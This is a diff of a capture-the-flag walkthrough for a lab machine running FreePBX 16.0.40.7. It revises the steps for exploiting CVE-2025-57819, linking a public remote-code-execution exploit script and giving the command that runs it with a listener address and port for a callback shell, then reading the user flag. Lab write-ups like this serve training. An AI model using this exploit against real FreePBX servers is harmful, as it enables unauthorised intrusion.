@@ -33,7 +33,7 @@ As we can see, there is a service running on port 80, so lets add the ip to the 
 	$ echo '10.129.245.100 connected.htb' | sudo tee -a /etc/hosts
 
 
-If we go to the website we'll see at the bottom that its running FreePBX version 16.0.40.7. After a websearch we can see that this version is vulnerable to CVE-2025-57819.
+If we go to the website we'll see at the bottom of the page that its running FreePBX version 16.0.40.7. A web search will show that this version is vulnerable to CVE-2025-57819.
 
 
 
@@ -43,23 +43,14 @@ Get the Exploit Script:
 
 	https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE/blob/main/exploit.py
 
+Run the exploit and be sure to include the flags for http mode and your vpn ip:
 
-Check Maximum Transmission Unit (MTU) Size:
-
-	$ ip link show tun0
-	... mtu 1500 ...
-
-- If this is too large it can cause packet transmission to fail. So if the exploit fails try decreasing the MTU value to 1200.
-
-	$ sudo ip link set dev tun0 mtu 1200
+	$ ./exploit.py --rhost "connected.htb" --rport 80 --http --lhost 10.10.17.19 --lport 4444
 
 
-Run the exploit:
+- This may fail to connect, if so try it again.
 
-	$ ./exploit.py --rhost "connected.htb" --rport 80 --http --lport 4444 --lhost 10.10.17.19
-
-
-Now that were in the system lets get the user flag:
+Once we're in the system lets get the user flag:
 
 	$ cat /home/asterisk/user.txt
 
